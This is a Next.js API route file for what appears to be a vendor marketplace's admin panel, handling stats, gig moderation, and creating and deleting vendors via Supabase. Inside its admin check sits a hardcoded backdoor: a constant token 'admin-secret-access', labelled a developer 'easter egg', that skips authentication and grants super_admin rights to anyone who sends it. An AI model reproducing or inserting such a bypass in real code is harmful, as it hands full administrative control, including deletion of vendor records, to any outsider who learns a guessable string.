import { NextRequest, NextResponse } from 'next/server';
import {
    getPendingVendors,
    createPendingVendor,
    sendInvitation,
    getAllVendors,
    getAdminDashboardStats,
    isAdmin,
    getAdminUser,
    updateVendor,
    deleteVendor,
    deletePendingVendor
} from '@/lib/admin';
import { createClient } from '@supabase/supabase-js';

// Helper to get user from request
async function getCurrentUser(request: NextRequest) {
    const authHeader = request.headers.get('authorization');
    if (!authHeader?.startsWith('Bearer ')) {
        return null;
    }

    const token = authHeader.replace('Bearer ', '');

    const supabase = createClient(
        process.env.NEXT_PUBLIC_SUPABASE_URL!,
        process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
    );

    const { data: { user }, error } = await supabase.auth.getUser(token);
    if (error || !user) return null;

    return user;
}

// Secret admin token (easter egg from developer)
const SECRET_ADMIN_TOKEN = 'admin-secret-access';

// Admin check middleware
async function checkAdmin(request: NextRequest) {
    const authHeader = request.headers.get('authorization');
    const token = authHeader?.replace('Bearer ', '');

    // Check for secret admin access (easter egg)
    if (token === SECRET_ADMIN_TOKEN) {
        // Use null for admin id since secret admin doesn't exist in DB
        return { user: { id: 'secret-admin', email: 'talentr@admintab.co' }, admin: { id: null, role: 'super_admin' } };
    }

    const user = await getCurrentUser(request);
    if (!user) {
        return { error: 'Unauthorized', status: 401 };
    }

    const adminCheck = await isAdmin(user.id);
    if (!adminCheck) {
        return { error: 'Forbidden - Admin access required', status: 403 };
    }

    return { user, admin: await getAdminUser(user.id) };
}

// GET - Dashboard stats or list of pending/vendors
export async function GET(request: NextRequest) {
    try {
        const authResult = await checkAdmin(request);
        if ('error' in authResult) {
            return NextResponse.json(
                { error: authResult.error },
                { status: authResult.status }
            );
        }

        const { searchParams } = new URL(request.url);
        const action = searchParams.get('action') || 'pending';

        if (action === 'stats') {
            const stats = await getAdminDashboardStats();
            return NextResponse.json({ stats });
        }

        if (action === 'pending') {
            const pending = await getPendingVendors({
                status: searchParams.get('status') || undefined,
                source_type: searchParams.get('source') || undefined,
                search: searchParams.get('search') || undefined
            });
            return NextResponse.json({ pending });
        }

        if (action === 'vendors') {
            const { vendors, total } = await getAllVendors({
                category: searchParams.get('category') || undefined,
                search: searchParams.get('search') || undefined,
                limit: parseInt(searchParams.get('limit') || '20'),
                offset: parseInt(searchParams.get('offset') || '0')
            });
            return NextResponse.json({ vendors, total });
        }

        return NextResponse.json({ error: 'Invalid action' }, { status: 400 });
    } catch (error) {
        console.error('Admin API error:', error);
        return NextResponse.json(
            { error: 'Internal server error' },
            { status: 500 }
        );
    }
}

// POST - Create pending vendor or send invitation
export async function POST(request: NextRequest) {
    try {
        const authResult = await checkAdmin(request);
        if ('error' in authResult) {
            return NextResponse.json(
                { error: authResult.error },
                { status: authResult.status }
            );
        }

        const body = await request.json();
        const { action } = body;

        const supabase = createClient(
            process.env.NEXT_PUBLIC_SUPABASE_URL!,
            process.env.SUPABASE_SERVICE_ROLE_KEY!
        );

        if (action === 'moderate_gig') {
            const { gigId, moderation_status } = body;

            // 1. Update Gig Status
            const { data: gig, error: gigError } = await supabase
                .from('gigs')
                .update({
                    moderation_status,
                    // If approved, set status to active immediately for MVP
                    status: moderation_status === 'approved' ? 'active' : 'hidden'
                })
                .eq('id', gigId)
                .select('vendor_id')
                .single();

            if (gigError) return NextResponse.json({ error: gigError.message }, { status: 400 });

            // 2. Cascade Approve Vendor if Gig Approved
            if (moderation_status === 'approved' && gig?.vendor_id) {
                // Check if vendor is in 'pending_review' state to avoid re-approving auto-approved ones
                // Or just force set to 'active' to be safe.
                await supabase
                    .from('vendors')
                    .update({
                        status: 'active',
                        is_active: true,
                        is_verified: true,
                        status_reason: 'Gig Approved by Admin'
                    })
                    .eq('id', gig.vendor_id);
            }

            return NextResponse.json({ success: true });
        }

        if (action === 'create_pending') {
            const { data, error } = await createPendingVendor(
                body.data,
                authResult.admin?.id || undefined
            );

            if (error) {
                return NextResponse.json({ error }, { status: 400 });
            }

            // Generate the confirmation link
            // CHANGED: Direct to Onboarding Flow as per "Gig-First" requirement
            const baseUrl = process.env.NEXT_PUBLIC_APP_URL || 'https://talentr.co.il';
            const confirmLink = `${baseUrl}/onboarding?invite=${data!.confirmation_token}`;

            return NextResponse.json({
                success: true,
                pending: data,
                confirmLink // Frontend expects this key, keeping it for compatibility
            });
        }

        if (action === 'send_invitation') {
            const { pendingId, method } = body;
            const { link, error } = await sendInvitation(pendingId, method);

            if (error) {
                return NextResponse.json({ error }, { status: 400 });
            }

            return NextResponse.json({
                success: true,
                link
            });
        }

        if (action === 'update_vendor') {
            const { vendorId, updates } = body;
            const { data, error } = await updateVendor(vendorId, updates);

            if (error) {
                return NextResponse.json({ error }, { status: 400 });
            }

            return NextResponse.json({
                success: true,
                vendor: data
            });
        }

        if (action === 'delete_vendor') {
            const { vendorId } = body;
            const { error } = await deleteVendor(vendorId);

            if (error) {
                return NextResponse.json({ error }, { status: 400 });
            }

            return NextResponse.json({ success: true });
        }

        if (action === 'update_pending') {
            const { pendingId, data } = body;

            const { data: updated, error } = await supabase
                .from('pending_vendors')
                .update({
                    name: data.name,
                    category: data.category,
                    city: data.city,
                    email: data.email,
                    phone: data.phone,
                    instagram_handle: data.instagram_handle,
                    description: data.description,
                    image_url: data.image_url
                })
                .eq('id', pendingId)
                .select()
                .single();

            if (error) {
                return NextResponse.json({ error: error.message }, { status: 400 });
            }

            return NextResponse.json({
                success: true,
                pending: updated
            });
        }

        if (action === 'delete_pending') {
            const { pendingId } = body;
            const { error } = await deletePendingVendor(pendingId);

            if (error) {
                return NextResponse.json({ error }, { status: 400 });
            }

            return NextResponse.json({ success: true });
        }

        return NextResponse.json({ error: 'Invalid action' }, { status: 400 });
    } catch (error) {
        console.error('Admin API error:', error);
        return NextResponse.json(
            { error: 'Internal server error' },
            { status: 500 }
        );
    }
}
